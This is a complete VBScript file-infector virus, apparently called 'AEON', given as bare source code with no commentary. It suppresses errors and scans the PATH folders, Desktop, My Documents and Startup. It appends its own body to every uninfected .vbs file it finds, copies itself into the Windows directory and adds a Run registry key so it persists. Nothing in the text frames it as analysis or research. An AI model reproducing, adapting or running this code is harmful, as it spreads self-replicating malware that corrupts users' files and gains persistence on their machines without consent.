On Error Resume Next
Dim AE6, J333, AE7, AE1, AE2, AE3, AE4
Dim T111
Dim AE5(200)
Dim XR
Set WSHShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WSHShell.Environment("Process")
AE10 = WshSysEnv("Path")
AE7 = WSHShell.ExpandEnvironmentStrings("%windir%\aeon.vbs")
AE1 = Wscript.ScriptFullName
Set AE6 = CreateObject("Scripting.FileSystemObject")
XR = 1
T11 = Wscript.ScriptFullName
For x = Len(AE10) To 1 Step -1
AE4 = Mid(AE10, x, 1)
If AE4 <> ";" Then
AE5(XR) = AE4 + AE5(XR)
ElseIf AE4 = ";" Then
AE5(XR) = AE5(XR) + "\"
XR = XR + 1
End If
Next
AE5(XR) = AE5(XR) + "\"
AE5(XR + 1) = WSHShell.SpecialFolders("Desktop") + "\"
AE5(XR + 2) = WSHShell.SpecialFolders("MyDocuments") + "\"
AE5(XR + 3) = WSHShell.SpecialFolders("Startup") + "\"
AE5(XR + 4) = Left(T11, InStrRev(T11, "\"))
Set TS = AE6.OpenTextFile(T11, 1)
AE9 = TS.ReadAll
TS.Close
AE8 = Chr(167)
endAE8 = "'" & AE8
For x = Len(AE9) To 1 Step -1
If Mid(AE9, x, 1) = AE8 Then
x = 1
AE3 = endAE8 + AE3
ElseIf Mid(AE9, x, 1) <> AE8 Then
AE3 = Mid(AE9, x, 1) + AE3
End If
Next
For y = 1 To (XR + 4)
For Each Target In AE6.GetFolder(AE5(y)).Files
If UCase(Right(Target.Name, 3)) = "VBS" Then
IV11 = ""
Set TS = AE6.OpenTextFile(AE5(y) & Target.Name, 1)
AE11 = TS.ReadAll
TS.Close
If mid(AE11,(len(AE11)-2),1) <> "z" Then
Set TS = AE6.OpenTextFile(AE5(y) & Target.Name, 8)
TS.Write AE3
TS.Close
End If
End If
Next
Next
FAE11 (AE7)
If T111 = False Then
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AEON", AE7
Set J337 = AE6.OpenTextFile(AE7, 2, True)
J337.Write AE3
J337.Close
End If
Function FAE11(filespec)
Set AE6 = CreateObject("Scripting.FileSystemObject")
If (AE6.FileExists(filespec)) Then
T111 = True
Else
T111 = False
End If
End Function